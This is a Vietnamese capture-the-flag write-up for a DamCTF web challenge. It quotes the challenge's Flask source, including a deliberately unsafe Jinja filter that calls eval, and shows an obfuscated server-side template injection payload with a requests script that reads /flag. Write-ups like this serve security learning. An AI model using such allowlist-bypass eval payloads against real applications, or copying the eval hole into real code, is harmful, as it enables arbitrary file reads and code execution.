![img](https://github.com/magnetohvcs/ctf/blob/main/damctf/image/4.png)
</br>
 tôi solve lượt 6
![img](https://github.com/magnetohvcs/ctf/blob/main/damctf/image/5.png)

bài này tác giả có cho `super-secure-translation-implementation.zip` bên trong có file __Dockerfile__ xác định được vị trí flag ở __/flag__
</br> khi vào web sẽ hiện ra nội dung của file __app.py__
![img](https://github.com/magnetohvcs/ctf/blob/main/damctf/image/6.png)
với đoạn mã sau
```@server.route("/")
@server.route("/<path>")
def index(path=""):
    # Show app.py source code on homepage, even if not requested.
    if path == "":
        path = "app.py"

    # Make this request hackproof, ensuring that only app.py is displayed.
    elif not os.path.exists(path) or "/" in path or ".." in path:
        path = "app.py"

    # User requested app.py, show that.
    with open(path, "r") as f:
        return render_template("index.html", code=f.read())
  ``` 
  giúp ta có thể đọc file trong thư mục __/chal__ bằng việc thay đổi path url, vì dấu `..` và `/` đã bị filter nên không thể đọc bên ngoài thư mục __/chal__
  ```
from check import detect_remove_hacks
from filters import *
```
ở đoạn này, file app.py có tham chiếu đến 2 file khác là __check.py__ và __filters.py__ vậy ta chỉ cần truy cập đến 
đường dẫn `https://super-secure-translation-implementation.chals.damctf.xyz/check.py` để xem nội dung file __check.py__ 
![img](https://github.com/magnetohvcs/ctf/blob/main/damctf/image/7.png)
và đường dẫn `https://super-secure-translation-implementation.chals.damctf.xyz/filters.py` để xem nội dung __filters.py__
![img](https://github.com/magnetohvcs/ctf/blob/main/damctf/image/8.png)
</br>tóm tắt là chỉ cần chèn payload vào __/secure_translate?payload=__ để tấn công ssti nhưng đa số đều bị filters chỉ có một số không bị

```  
allowlist = [
        "c", "{","}","d","6","l","(","b","o","r",")",'"',"1","4","+","h","u","-","*","e","|","'",
 ]
```
Ở đoạn này trong file __app.py__
```
server = Flask(__name__)

# Add filters to the jinja environment to add string
# manipulation capabilities
server.jinja_env.filters["u"] = uppercase
server.jinja_env.filters["l"] = lowercase
server.jinja_env.filters["b64d"] = b64d
server.jinja_env.filters["order"] = order
server.jinja_env.filters["ch"] = character
server.jinja_env.filters["e"] = e
```
tóm tắt là ý nghĩa rằng hàm e là __eval__ và hàm ch là __chr__ được tham chiều từ check.py, ta sẽ tiếp tục phân tích ở hàm e xem file filters.py
```
def e(x):
    # Security analysts reviewed this and said eval is unsafe (haters).
    # They would not approve this as "hack proof" unless I add some
    # checks to prevent easy exploits.

    print(f"Evaluating: {x}")

    forbidlist = [" ", "=", ";", "\n", ".globals", "exec"]

    for y in forbidlist:
        if y in x:
            return "Eval Failed: Foridlist."

    if x[0:4] == "open" or x[0:4] == "eval":
        return "Not That Easy ;)"

    try:
        return eval(x)
    except Exception as exc:
        return f"Eval Failed: {exc}"
```
4 ký tự đầu không được là __open__ và __exec__ 
</br>Payload của tôi là `{{(""+open('/flag').read())|e}}` để bypass filter tôi đã sửa thành `{{('""%2bo'%2b((111%2b1)|ch)%2b'e'%2b((111-1)|ch)%2b'("'%2b((46%2b1)|ch)%2b((114-11-1)|ch)%2b'l'%2b((111-14)|ch)%2b((114-11)|ch)%2b'")'%2b(46|ch)%2b're'%2b((111-14)|ch)%2b'd()')|e}}` 
</br> và đây là
flag mà tôi tìm được __dam{p4infu1_all0wl1st_w3ll_don3}__
</br> cách giải của tôi
```

import requests
s = requests.session()
payload='''{{('""%2bo'%2b((111%2b1)|ch)%2b'e'%2b((111-1)|ch)%2b'("'%2b((46%2b1)|ch)%2b((114-11-1)|ch)%2b'l'%2b((111-14)|ch)%2b((114-11)|ch)%2b'")'%2b(46|ch)%2b're'%2b((111-14)|ch)%2b'd()')|e}}''' 

url = 'https://super-secure-translation-implementation.chals.damctf.xyz/secure_translate/?payload='+payload
res = s.get(url).text
print(res)
```
